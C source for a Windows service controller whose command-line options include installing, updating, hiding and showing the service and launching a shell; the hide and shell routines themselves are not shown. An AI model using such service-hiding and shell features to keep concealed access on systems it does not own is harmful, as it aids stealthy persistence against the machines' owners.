#include "svc.h"

SERVICE_STATUS svcStatus;
SERVICE_STATUS_HANDLE svcStatusHandle;
HANDLE svcStopEvt = NULL; 
static void t(void)
{
    char *te = malloc(1);
    (void)te;
}


int main(int ac, char *av[])
{
    #ifdef DEBUG
        _CrtSetDbgFlag ( _CRTDBG_ALLOC_MEM_DF | _CRTDBG_LEAK_CHECK_DF );
    #endif
    if (ac == 1)
    {
        SERVICE_TABLE_ENTRY DispatchTable[] = {
            {
                SVC_NAME, (LPSERVICE_MAIN_FUNCTION)SvcMain
            },
            {
                NULL, NULL
            }
        };
        if (!StartServiceCtrlDispatcher(DispatchTable))
        {
            log("[Unable to connect to SCM.]\n");
            exit(1);
        }
    }
    else if (ac == 2)
    {
        SC_HANDLE SCManager = NULL;
        if (!strcmp(av[1], SVC_INSTALL))
        {
            SCManager =  OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
            if (SCManager == NULL) exit(PrintError());
            InstallSvc(SCManager);
        }
        else if (!strcmp(av[1], SVC_START))
        {
            SCManager =  OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
            if (SCManager == NULL) exit(PrintError());
            StartSvc(SCManager);
        }
        else if (!strcmp(av[1], SVC_STOP))
        {
            SCManager =  OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
            if (SCManager == NULL) exit(PrintError());
            StopSvc(SCManager);
        }
        else if (!strcmp(av[1], SVC_DELETE))
        {
            SCManager =  OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
            if (SCManager == NULL) exit(PrintError());
            DeleteSvc(SCManager);
        }
        else if (!strcmp(av[1], SVC_UPDATE))
        {
            SCManager =  OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
            if (SCManager == NULL) exit(PrintError());
            UpdateSvc(SCManager);
        }
        else if (!strcmp(av[1], SVC_HIDE))
        {
            SCManager =  OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
            if (SCManager == NULL) exit(PrintError());
            HideSvc(SCManager);
        }
        else if (!strcmp(av[1], SVC_SHOW))
        {
            SCManager =  OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
            if (SCManager == NULL) exit(PrintError());
            ShowSvc(SCManager);
        }
        else if (!strcmp(av[1], SVC_SHELL))
        {
            Shell();
        }
        else
        {
            printf(SVC_USAGE);
            exit(1);
        }
    }
    else
    {
        printf(SVC_USAGE);
        exit(1);
    }
    t();
    _CrtSetReportMode(_CRT_WARN, _CRTDBG_MODE_DEBUG); 
    _CrtDumpMemoryLeaks();
    exit(0);
}